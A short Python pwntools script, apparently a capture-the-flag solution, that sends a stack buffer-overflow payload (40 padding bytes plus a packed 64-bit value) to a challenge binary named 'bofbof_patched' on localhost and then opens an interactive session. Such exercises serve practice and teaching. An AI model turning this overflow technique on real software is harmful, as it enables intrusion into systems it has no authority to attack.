#!/usr/bin/env python3

from pwn import *

exe = ELF("./bofbof_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("localhost", 4000)

    return r


def main():
    r = conn()

    payload = b'A' * 40
    payload += p64(0x1122334455667788)
    r.sendlineafter(b'>>', payload)
    r.interactive()


if __name__ == "__main__":
    main()
